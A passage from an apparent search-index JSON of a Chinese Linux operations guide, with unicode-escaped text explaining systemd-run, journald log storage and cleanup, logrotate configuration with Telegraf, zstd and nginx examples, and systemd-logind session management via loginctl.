\u200b\u5728\u200b\u8fdb\u7a0b\u200b\u9000\u51fa\u200b\u540e\u200b\u7acb\u523b\u200b\u56de\u6536\u200b\u670d\u52a1\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4e0d\u662f\u200b\u6b63\u5e38\u200b\u9000\u51fa\u200b\uff08\u200b\u5982\u975e\u200b\u96f6\u200b\u7684\u200b exit code \u200b\u6216\u200b\u88ab\u200b\u4fe1\u53f7\u200b\u6740\u6b7b\u200b\uff09\u3002</li> </ul> <p>\u200b\u540c\u65f6\u200b\uff0c<code>systemd-run</code> \u200b\u8fd8\u6709\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u670d\u52a1\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u8fd0\u884c\u200b\u73af\u5883\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u548c\u200b\u8f93\u5165\u8f93\u51fa\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\u7b49\u200b\uff0c\u200b\u5177\u4f53\u200b\u53ef\u200b\u53c2\u8003\u200b <code>systemd-run(1)</code>\u3002</p> <p>\u200b\u57fa\u4e8e\u200b\u8fd9\u4e9b\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u672c\u6587\u200b\u8ba4\u4e3a\u200b <code>systemd-run</code> \u200b\u662f\u200b <code>nohup</code> \u200b\u547d\u4ee4\u200b\u7684\u200b\u5168\u9762\u200b\u66ff\u4ee3\u54c1\u200b\uff0c\u200b\u4e5f\u200b\u9f13\u52b1\u200b\u8bfb\u8005\u200b\u5c3d\u91cf\u200b\u4f7f\u7528\u200b <code>systemd-run</code> \u200b\u6765\u200b\u8fd0\u884c\u200b\u5404\u79cd\u200b\u4e00\u6b21\u6027\u200b\u7684\u200b\u540e\u53f0\u200b\u547d\u4ee4\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f7f\u7528\u200b <code>nohup</code> \u200b\u548c\u200b <code>&amp;</code>\u3002</p> <p>\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\uff0c\u200b\u666e\u901a\u7528\u6237\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>systemd-run --user</code> \u200b\u4ee5\u200b\u8fd0\u884c\u200b\u4e34\u65f6\u200b\u7684\u200b\u7528\u6237\u670d\u52a1\u200b\uff0c\u200b\u800c\u200b\u975e\u200b\u7cfb\u7edf\u200b\u670d\u52a1\u200b\u3002</p>"},{"location":"ops/service/#log","title":"\u65e5\u5fd7\u200b\u7ba1\u7406","text":""},{"location":"ops/service/#systemd-journald","title":"Systemd-journald","text":"<p>Journald \u200b\u662f\u200b systemd \u200b\u5957\u4ef6\u200b\u4e2d\u200b\u8d1f\u8d23\u7ba1\u7406\u200b\u65e5\u5fd7\u200b\u7684\u200b\u90e8\u5206\u200b\u3002\u200b\u4e0e\u200b\u4f20\u7edf\u200b\u7684\u200b <code>/var/log/*.log</code> \u200b\u6587\u4ef6\u200b\u4e0d\u540c\u200b\uff0cjournald \u200b\u80fd\u591f\u200b\u5904\u7406\u200b\u7ed3\u6784\u5316\u200b\u6570\u636e\u200b\uff08\u200b\u4f8b\u5982\u200b KV\uff09\uff0c\u200b\u5e76\u4e14\u200b\u5c06\u200b\u65e5\u5fd7\u200b\u4ee5\u200b\u4e8c\u8fdb\u5236\u200b\u5f62\u5f0f\u200b\u4fdd\u5b58\u200b\u3002\u200b\u56e0\u6b64\u200b systemd-journald \u200b\u7684\u200b\u65e5\u5fd7\u200b\u4e0d\u80fd\u200b\u7b80\u5355\u200b\u901a\u8fc7\u200b\u6587\u672c\u200b\u67e5\u770b\u5668\u200b\uff08<code>less</code>\u3001<code>vim</code> \u200b\u7b49\u200b\uff09\u200b\u67e5\u770b\u200b\uff0c\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b <code>journalctl</code> \u200b\u7ba1\u7406\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u9009\u9879\u200b\u548c\u200b\u53c2\u6570\u200b\uff1a</p> \u200b\u9009\u9879\u200b \u200b\u8bf4\u660e\u200b <code>-u [unit]</code> \u200b\u53ea\u200b\u663e\u793a\u200b\u6307\u5b9a\u200b unit \u200b\u7684\u200b\u65e5\u5fd7\u200b <code>-e</code> \u200b\u663e\u793a\u200b\u6700\u65b0\u200b\u7684\u200b\u65e5\u5fd7\u200b\uff08\u200b\u81ea\u52a8\u200b\u5c06\u200b less \u200b\u8df3\u8f6c\u200b\u5230\u200b\u672b\u5c3e\u200b\uff09 <code>-f</code> \u200b\u5b9e\u65f6\u200b\u67e5\u770b\u200b\u65e5\u5fd7\u200b\uff08\u200b\u7c7b\u4f3c\u200b <code>tail -f</code>\uff09 <code>-x</code> \u200b\u4e3a\u200b\u4e8b\u4ef6\u200b\u663e\u793a\u200b\u989d\u5916\u200b\u7684\u200b\u89e3\u91ca\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5982\u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\u3001\u200b\u505c\u6b62\u200b\u7b49\u200b <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cjournald \u200b\u4f1a\u200b\u5c06\u200b\u65e5\u5fd7\u200b\u5b58\u50a8\u200b\u5728\u200b <code>/var/log/journal</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u76ee\u5f55\u200b\u4e0d\u200b\u5b58\u5728\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b\u4f7f\u7528\u200b <code>/run/log/journal</code>\u3002\u200b\u7531\u4e8e\u200b <code>/run</code> \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b tmpfs\uff0c\u200b\u82e5\u200b\u914d\u7f6e\u200b\u4e0d\u5f53\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5185\u5b58\u200b\u5360\u7528\u200b\u8fc7\u9ad8\u200b\uff0c\u200b\u4e14\u200b\u91cd\u542f\u200b\u540e\u200b\u65e5\u5fd7\u200b\u4e22\u5931\u200b\u3002</p> <p>Journald \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b <code>/etc/systemd/journald.conf</code>\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>journald.conf(5)</code> \u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u200b\uff0cDebian \u200b\u4e5f\u200b\u4f1a\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u5185\u4ee5\u200b\u6ce8\u91ca\u200b\u7684\u200b\u5f62\u5f0f\u200b\u63d0\u4f9b\u200b\u6240\u6709\u200b\u914d\u7f6e\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\u3002\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u6709\u200b\uff1a</p> \u200b\u914d\u7f6e\u200b\u9879\u200b \u200b\u8bf4\u660e\u200b Storage= \u200b\u6307\u5b9a\u200b\u65e5\u5fd7\u200b\u5b58\u50a8\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u662f\u200b <code>auto</code>\u3001<code>volatile</code>\u3001<code>persistent</code> \u200b\u548c\u200b <code>none</code> SystemMaxUse=SystemKeepFree= \u200b\u6307\u5b9a\u200b\u7cfb\u7edf\u65e5\u5fd7\u200b\uff08<code>/var/log/journal</code>\uff09\u200b\u7684\u200b\u6700\u5927\u200b\u5360\u7528\u200b\u7a7a\u95f4\u200b\u6216\u200b\u4fdd\u8bc1\u200b\u78c1\u76d8\u200b\u7684\u200b\u7a7a\u4f59\u200b\u7a7a\u95f4\u200b RuntimeMaxUse=RuntimeKeepFree= \u200b\u6307\u5b9a\u200b\u8fd0\u884c\u200b\u65f6\u200b\u65e5\u5fd7\u200b\uff08<code>/run/log/journal</code>\uff09\u200b\u7684\u200b\u6700\u5927\u200b\u5360\u7528\u200b\u7a7a\u95f4\u200b\u6216\u200b\u4fdd\u8bc1\u200b\u78c1\u76d8\u200b\u7684\u200b\u7a7a\u4f59\u200b\u7a7a\u95f4\u200b MaxRetentionSec=MaxFileSec= \u200b\u6307\u5b9a\u200b\u65e5\u5fd7\u200b\u5185\u5bb9\u200b\u548c\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u7684\u200b\u6700\u5927\u200b\u4fdd\u5b58\u200b\u65f6\u95f4\u200b <p>\u200b\u907f\u514d\u200b\u8986\u76d6\u200b\u7531\u5305\u200b\u7ba1\u7406\u5668\u200b\u7ba1\u7406\u200b\u7684\u200b\u6587\u4ef6\u200b</p> <p>\u200b\u81ea\u200b systemd v249 \u200b\u8d77\u200b\uff08Ubuntu 22.04\uff0cDebian 12 Bookworm\uff09\uff0c\u200b\u6240\u6709\u200b <code>/etc/systemd/*.conf</code> \u200b\u6587\u4ef6\u200b\u5747\u200b\u652f\u6301\u200b <code>*.conf.d</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u5373\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b <code>/etc/systemd/journald.conf.d/</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u5176\u4e2d\u200b\u521b\u5efa\u200b\u6587\u4ef6\u200b\u6765\u200b\u8986\u76d6\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\uff0c\u200b\u800c\u200b\u65e0\u9700\u200b\u4fee\u6539\u200b <code>*.conf</code> \u200b\u6587\u4ef6\u200b\u672c\u8eab\u200b\uff0c\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u5728\u200b\u8f6f\u4ef6\u5305\u200b\u66f4\u65b0\u200b\u6216\u200b\u7cfb\u7edf\u5347\u7ea7\u200b\u65f6\u200b\u5904\u7406\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u4fee\u6539\u200b\u51b2\u7a81\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8981\u200b\u9650\u5236\u200b\u78c1\u76d8\u200b\u5360\u7528\u200b\uff08<code>/var/log/journal</code>\uff09\u200b\u4e3a\u200b 1G\uff0c\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u5982\u4e0b\u200b\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u91cd\u542f\u200b <code>systemd-journald</code> \u200b\u670d\u52a1\u200b\uff1a</p> /etc/systemd/journald.conf.d/override.conf<pre><code>[Journal]\nSystemMaxUse=1G\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u6e05\u7406\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u91ca\u653e\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>journalctl --vacuum-size=100M</code> \u200b\u6765\u200b\u6e05\u7406\u200b\u65e5\u5fd7\u200b\uff0cjournald \u200b\u4f1a\u200b\u5220\u9664\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u76f4\u5230\u200b\u78c1\u76d8\u200b\u5360\u7528\u200b\u5c0f\u4e8e\u200b 100M\u3002\u200b\u53e6\u5916\u200b\u6709\u200b\u4e24\u4e2a\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u53c2\u6570\u200b <code>--vacuum-time=</code> \u200b\u548c\u200b <code>--vacuum-files=10</code> \u200b\u4e5f\u200b\u53ef\u200b\u53c2\u8003\u200b\u3002</p>"},{"location":"ops/service/#logrotate","title":"logrotate","text":"<p>\u200b\u6309\u7167\u200b Unix \u200b\u7684\u200b\u201c\u200b\u4e00\u4e2a\u200b\u7a0b\u5e8f\u200b\u53ea\u200b\u505a\u200b\u4e00\u4ef6\u200b\u4e8b\u200b\u201d\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u601d\u60f3\u200b\uff0c\u200b\u4e00\u822c\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u53ea\u7ba1\u200b\u5c06\u200b\u65e5\u5fd7\u200b\u8f93\u51fa\u200b\u5230\u200b\u6307\u5b9a\u200b\u5730\u65b9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6709\u200b\u4e86\u200b logrotate \u200b\u8fd9\u4e2a\u200b\u5de5\u5177\u200b\u6765\u200b\u8d1f\u8d23\u200b\u65e5\u5fd7\u200b\u7684\u200b\u201c\u200b\u6eda\u52a8\u200b\u201d\uff08rotate\uff09\uff0c\u200b\u5373\u200b\u91cd\u547d\u540d\u200b\u3001\u200b\u538b\u7f29\u200b\u3001\u200b\u5220\u9664\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u3002</p> <p>logrotate \u200b\u7684\u200b\u5168\u5c40\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b <code>/etc/logrotate.conf</code>\uff0c\u200b\u800c\u200b\u6bcf\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5219\u200b\u4f4d\u4e8e\u200b <code>/etc/logrotate.d/</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002\u200b\u4ee5\u200b Telegraf \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5176\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5982\u4e0b\u200b\uff1a</p> /etc/logrotate.d/telegraf<pre><code>/var/log/telegraf/telegraf.log\n{\n    rotate 6\n    daily\n    missingok\n    dateext\n    copytruncate\n    notifempty\n    compress\n}\n</code></pre> <p>\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u5f00\u5934\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u6587\u4ef6\u200b\uff08\u200b\u6bcf\u884c\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b shell \u200b\u7684\u200b\u901a\u914d\u7b26\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u6709\u200b\uff1a</p> rotate &lt;n&gt; <p>\u200b\u4fdd\u7559\u200b\u7684\u200b\u989d\u5916\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u6570\u91cf\u200b\u3002\u200b\u4f8b\u5982\u200b <code>rotate 6</code> \u200b\u4f1a\u200b\u4fdd\u7559\u200b <code>example.log</code>\u3001<code>example.log.1</code> \u200b\u76f4\u5230\u200b <code>example.log.6</code>\uff0c\u200b\u800c\u200b <code>example.log.7</code> \u200b\u5219\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u5220\u9664\u200b\u3002</p> daily / weekly / monthly / yearly <p>rotate \u200b\u7684\u200b\u9891\u7387\u200b\uff0c\u200b\u4e5f\u8bb8\u200b\u4f60\u200b\u5e76\u4e0d\u9700\u8981\u200b\u4f7f\u7528\u200b\u540e\u200b\u4e24\u8005\u200b\u3002</p> missingok / notifempty <p>\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\u7684\u200b\u5904\u7406\u200b\u65b9\u5f0f\u200b\uff08\u200b\u89c1\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u9009\u9879\u200b\u7684\u200b\u5b57\u9762\u200b\u542b\u4e49\u200b\uff09\u3002</p> dateext / dateformat <p>\u200b\u4f7f\u7528\u200b\u65e5\u671f\u200b\u4f5c\u4e3a\u200b\u540e\u7f00\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f7f\u7528\u200b <code>.1</code>\u3001<code>.2</code> \u200b\u7b49\u200b\u3002\u200b\u53e6\u6709\u200b <code>dateyesterday</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u5373\u200b\u4f7f\u7528\u200b\u6628\u5929\u200b\u7684\u200b\u65e5\u671f\u200b\u6765\u200b\u547d\u540d\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u6587\u4ef6\u540d\u200b\u4e2d\u200b\u7684\u200b\u65e5\u671f\u200b\u548c\u200b\u6587\u4ef6\u200b\u5185\u5bb9\u200b\u5c3d\u53ef\u80fd\u200b\u4e00\u81f4\u200b\u3002</p> copytruncate <p>\u200b\u5c06\u200b\u6587\u4ef6\u200b\u5185\u5bb9\u200b\u590d\u5236\u5230\u200b\u65b0\u200b\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u6e05\u7a7a\u200b\u539f\u6587\u4ef6\u200b\u3002\u200b\u7a0b\u5e8f\u200b\u9700\u8981\u200b\u4ee5\u200b <code>O_APPEND</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u6253\u5f00\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9020\u6210\u200b\u9519\u4e71\u200b\u3002</p> <p>\u200b\u9002\u7528\u200b\u4e8e\u200b\u4e0d\u200b\u652f\u6301\u200b\u901a\u8fc7\u200b <code>SIGHUP</code> \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u91cd\u65b0\u200b\u6253\u5f00\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u652f\u6301\u200b\u201c\u200b\u91cd\u8f7d\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u201d\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\u3002</p> create &lt;mode&gt; &lt;owner&gt; &lt;group&gt; <p>\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u65f6\u200b\u7684\u200b\u6743\u9650\u200b\u548c\u200b\u6240\u6709\u8005\u200b\u3002\u200b\u5982\u679c\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u521b\u5efa\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u200b\u3002</p> compresscompresscmduncompresscmdcompressextcompressoptions <p>\u200b\u538b\u7f29\u200b\u65e7\u200b\u7684\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u538b\u7f29\u200b\u53c2\u6570\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b <code>gzip</code> / <code>gunzip</code> / <code>.gz</code> / <code>-9</code>\uff09\u3002\u200b\u5176\u4e2d\u200b <code>compress</code> \u200b\u662f\u200b\u5f00\u5173\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\u662f\u200b <code>nocompress</code>\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b Zstd \u200b\u538b\u7f29\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>compresscmd /usr/bin/zstd\nuncompresscmd /usr/bin/unzstd\ncompressext .zst\ncompressoptions -13 -T0\n</code></pre> delaycompress <p>\u200b\u4e0d\u200b\u538b\u7f29\u200b\u521a\u200b rotate \u200b\u51fa\u6765\u200b\u7684\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5373\u200b\u4fdd\u7559\u200b <code>example.log</code> \u200b\u548c\u200b <code>example.log.1</code>\uff0c\u200b\u538b\u7f29\u200b <code>.2</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>example.log.1</code> \u200b\u4f1a\u200b\u88ab\u200b\u538b\u7f29\u200b</p> prerotate / postrotate <p>\u200b\u5728\u200b rotate \u200b\u4e4b\u524d\u200b/\u200b\u4e4b\u540e\u200b\u6267\u884c\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u547d\u4ee4\u200b\u5757\u200b\u9700\u8981\u200b\u4ee5\u200b <code>endscript</code> \u200b\u7ed3\u675f\u200b\u3002\u200b\u4e0e\u200b Makefile / Dockerfile \u200b\u7b49\u200b\u8bed\u6cd5\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u6bcf\u200b\u884c\u4e3a\u200b\u5355\u72ec\u200b\u7684\u200b\u4e00\u4e2a\u200b\u547d\u4ee4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u8981\u200b\u5c06\u200b <code>if</code> \u200b\u7b49\u200b shell \u200b\u8bed\u6cd5\u200b\u5199\u6210\u200b\u591a\u884c\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u9664\u4e86\u200b\u6700\u540e\u200b\u4e00\u884c\u200b\u4ee5\u5916\u200b\u7684\u200b\u6bcf\u200b\u4e00\u884c\u200b\u672b\u5c3e\u200b\u4f7f\u7528\u200b\u53cd\u200b\u659c\u6760\u200b\uff0c\u200b\u907f\u514d\u200b\u88ab\u200b\u89e3\u91ca\u200b\u6210\u200b\u591a\u6761\u200b\u547d\u4ee4\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0cNginx \u200b\u8f6f\u4ef6\u5305\u200b\u63d0\u4f9b\u200b\u7684\u200b\u914d\u7f6e\u200b\u5c31\u200b\u4f1a\u200b\u5728\u200b rotate \u200b\u4e4b\u540e\u200b\u91cd\u8f7d\u200b Nginx\uff1a</p> /etc/logrotate.d/nginx<pre><code>postrotate\n    invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1\nendscript\n</code></pre> <p>\u200b\u4fee\u6539\u200b\u4e86\u200b logrotate \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>logrotate -d /etc/logrotate.conf</code> \u200b\u6765\u200b\u6d4b\u8bd5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u771f\u6b63\u200b\u6267\u884c\u200b\u4efb\u4f55\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u540c\u65f6\u200b\u7531\u4e8e\u200b logrotate \u200b\u4e0d\u200b\u5b58\u5728\u200b\u5b88\u62a4\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u800c\u662f\u200b\u901a\u8fc7\u200b systemd timer \u200b\u6765\u200b\u5b9a\u671f\u200b\u6267\u884c\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e4b\u540e\u200b\u4e0d\u200b\u9700\u8981\u200b\u91cd\u542f\u200b\u4efb\u4f55\u200b\u670d\u52a1\u200b\u3002</p>"},{"location":"ops/service/#logind","title":"\u767b\u5f55\u200b\u7ba1\u7406\u5668","text":"<p>systemd-logind \u200b\u662f\u200b systemd \u200b\u7684\u200b\u767b\u5f55\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u5176\u200b\u8d1f\u8d23\u200b\u7684\u200b\u529f\u80fd\u200b\u5305\u62ec\u200b\u7528\u6237\u200b session\u3001\u200b\u7535\u6e90\u200b\u7ba1\u7406\u200b\uff08\u200b\u4f8b\u5982\u200b\u6309\u4e0b\u200b\u7535\u6e90\u200b\u952e\u200b\u3001\u200b\u7b14\u8bb0\u672c\u7535\u8111\u200b\u76d2\u76d6\u200b\u65f6\u200b\u7684\u200b\u884c\u4e3a\u200b\uff09\u200b\u7b49\u200b\uff0c\u200b\u5177\u4f53\u200b\u53ef\u200b\u53c2\u8003\u200b systemd-logind(8)\u3002\u200b\u672c\u200b\u90e8\u5206\u200b\u4e3b\u8981\u200b\u5173\u6ce8\u200b\u5728\u200b\u65e5\u5e38\u200b\u8fd0\u7ef4\u4e2d\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7528\u5230\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u7279\u6027\u200b\u3002</p> <p>\u200b\u5728\u200b\u767b\u5f55\u200b\u7cfb\u7edf\u200b\u65f6\u200b\uff0cPAM \u200b\u7684\u200b <code>pam_systemd.so</code> \u200b\u6a21\u5757\u200b\u4f1a\u200b\u5728\u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u65f6\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b session\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u4f7f\u7528\u200b systemd \u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u7ba1\u200b\u662f\u200b SSH \u200b\u767b\u5f55\u200b\u3001\u200b\u901a\u8fc7\u200b TTY \u200b\u63a7\u5236\u53f0\u200b\u767b\u5f55\u200b\uff0c\u200b\u8fd8\u662f\u200b\u5728\u200b\u56fe\u5f62\u754c\u9762\u200b\u767b\u5f55\u200b\uff0c\u200b\u5728\u200b\u914d\u7f6e\u200b\u6b63\u786e\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u90fd\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b session\u3002</p> <p><code>loginctl list-sessions</code> \u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u7684\u200b\u6240\u6709\u200b\u7528\u6237\u200b session\uff1a</p> <pre><code>$ loginctl list-sessions\nSESSION  UID USER  SEAT  TTY\n      2 1000 user  seat0\n\n1 sessions listed.\n</code></pre> <p><code>loginctl</code> \u200b\u652f\u6301\u200b\u9501\u5b9a\u200b\uff08<code>lock-session</code>\uff09\u3001\u200b\u89e3\u9501\u200b\uff08<code>unlock-session</code>\uff09\u3001\u200b\u6ce8\u9500\u200b\uff08<code>terminate-session</code>\uff09\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u3002\u200b\u4e00\u79cd\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u662f\u200b\uff1a\u200b\u5728\u7ebf\u200b\u4e0b\u200b\u7684\u200b\u8ba1\u7b97\u673a\u200b\u7c7b\u200b\u6bd4\u8d5b\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u9650\u5236\u200b\u9009\u624b\u200b\u53ea\u80fd\u200b\u5728\u200b\u6bd4\u8d5b\u200b\u5f00\u59cb\u200b\u540e\u200b\u624d\u80fd\u200b\u767b\u5f55\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u5728\u200b\u6bd4\u8d5b\u200b\u7ed3\u675f\u200b\u540e\u200b\u4e0d\u200b\u80fd\u591f\u200b\u518d\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>loginctl</code> \u200b\u7684\u200b\u529f\u80fd\u200b\u6765\u200b\u5b9e\u73b0\u200b\u3002</p> <p>systemd \u200b\u4e2d\u200b\u6bcf\u4e2a\u200b session \u200b\u90fd\u200b\u4f1a\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b\u7528\u6237\u200b\u7ea7\u522b\u200b\u7684\u200b systemd \u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u7528\u4e8e\u200b\u7ba1\u7406\u200b\u7528\u6237\u200b\u7684\u200b\u670d\u52a1\u200b\u3001timer \u200b\u7b49\u200b\uff0c\u200b\u5728\u200b <code>systemctl</code>\u3001<code>journalctl</code> \u200b\u64cd\u4f5c\u200b\u65f6\u200b\u6dfb\u52a0\u200b <code>--user</code> \u200b\u53c2\u6570\u200b\u5373\u53ef\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7528\u6237\u200b\u7684\u200b\u670d\u52a1\u200b\u548c\u200b\u65e5\u5fd7\u200b\u7b49\u200b\u3002</p> <p>DBus</p> <p><code>systemctl</code>\u3001<code>journalctl</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\u4f9d\u8d56\u4e8e\u200b DBus \u200b\u603b\u7ebf\u200b\u4e0e\u200b systemd \u200b\u901a\u4fe1\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u7528\u6237\u200b session \u200b\u6765\u8bf4\u200b\uff0c\u200b\u5219\u200b\u4f9d\u8d56\u4e8e\u200b session \u200b\u7684\u200b DBus 